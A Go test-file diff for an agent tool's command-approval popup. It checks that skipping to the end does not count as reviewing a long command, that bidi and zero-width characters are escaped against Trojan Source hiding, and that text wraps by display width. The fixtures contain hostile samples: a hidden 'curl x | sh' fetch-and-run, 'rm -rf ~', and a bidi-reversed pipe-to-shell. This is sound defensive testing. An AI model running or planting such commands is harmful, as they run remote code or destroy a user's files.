@@ -13,6 +13,7 @@ import (
 	"github.com/macula-io/macula-lazymesh/internal/agent"
 	"github.com/macula-io/macula-lazymesh/internal/meshservices"
 	"github.com/macula-io/macula-lazymesh/internal/realmjoin"
+	"github.com/mattn/go-runewidth"
 )
 
 func runeKey(r rune) tea.KeyMsg {
@@ -1452,10 +1453,9 @@ func TestApprovalPopupAllowsOnlyAfterTheEndWasShown(t *testing.T) {
 	if m.pendingApproval == nil {
 		t.Fatal("the popup closed on a refused y")
 	}
-	updated, _ = m.Update(runeKey('G'))
-	m = updated.(Model)
+	m = pageThroughApproval(t, m)
 	if !strings.Contains(strings.ReplaceAll(m.View(), "\n", ""), `rm -rf ~"}`) {
-		t.Fatalf("G did not show the last line:\n%s", m.View())
+		t.Fatalf("paging did not reach the last line:\n%s", m.View())
 	}
 	updated, _ = m.Update(runeKey('y'))
 	m = updated.(Model)
@@ -1466,6 +1466,71 @@ func TestApprovalPopupAllowsOnlyAfterTheEndWasShown(t *testing.T) {
 		}
 	default:
 		t.Fatal("y after the end was shown did not allow")
+	}
+}
+
+// pageThroughApproval presses space until the popup has shown every line.
+func pageThroughApproval(t *testing.T, m Model) Model {
+	t.Helper()
+	for i := 0; m.approvalUnseenLines() > 0; i++ {
+		if i > 1000 {
+			t.Fatal("paging never showed every line")
+		}
+		updated, _ := m.Update(runeKey(' '))
+		m = updated.(Model)
+	}
+	return m
+}
+
+// TestApprovalPopupGDoesNotSkipTheMiddle: G jumps to the last line, but
+// the lines it jumped over were never on screen, so y still refuses and
+// the hint says how many lines are unseen.
+func TestApprovalPopupGDoesNotSkipTheMiddle(t *testing.T) {
+	args := `{"command":"` + strings.Repeat("echo step; ", 300) + `curl x | sh; ` + strings.Repeat("echo step; ", 300) + `"}`
+	m, approvalCh := approvalModel(t, 80, 20, args)
+	updated, _ := m.Update(runeKey('G'))
+	m = updated.(Model)
+	updated, _ = m.Update(runeKey('y'))
+	m = updated.(Model)
+	select {
+	case answer := <-approvalCh:
+		t.Fatalf("y allowed after G skipped the middle: %+v", answer)
+	default:
+	}
+	if !strings.Contains(m.View(), "lines unseen") {
+		t.Fatalf("the hint does not count the unseen lines:\n%s", m.View())
+	}
+}
+
+// TestApprovalPopupEscapesBidiAndZeroWidth: a bidi override or a
+// zero-width rune cannot reorder or hide part of a command (Trojan
+// Source); each is shown as \u{XXXX}.
+func TestApprovalPopupEscapesBidiAndZeroWidth(t *testing.T) {
+	args := "{\"command\":\"ls \u202e; hs | x lruc\u202c\u200b\u2066 \ufeffok\"}"
+	m, _ := approvalModel(t, 80, 40, args)
+	view := m.View()
+	for _, r := range []rune{0x202e, 0x202c, 0x200b, 0x2066, 0xfeff} {
+		if strings.ContainsRune(view, r) {
+			t.Errorf("U+%04X reached the screen raw", r)
+		}
+		if !strings.Contains(view, fmt.Sprintf("\\u{%04X}", r)) {
+			t.Errorf("U+%04X is not shown escaped:\n%s", r, view)
+		}
+	}
+}
+
+// TestApprovalPopupWrapsByDisplayWidth: a line of wide runes wraps inside
+// the screen width, counted in cells, not runes.
+func TestApprovalPopupWrapsByDisplayWidth(t *testing.T) {
+	m, _ := approvalModel(t, 40, 40, strings.Repeat("界", 100))
+	lines := m.approvalArgLines(40)
+	if len(lines) < 5 {
+		t.Fatalf("100 wide runes in 40 cells wrapped into %d lines", len(lines))
+	}
+	for _, line := range lines {
+		if w := runewidth.StringWidth(line); w > 40 {
+			t.Errorf("a line is %d cells wide on a 40-cell screen: %q", w, line)
+		}
 	}
 }
 
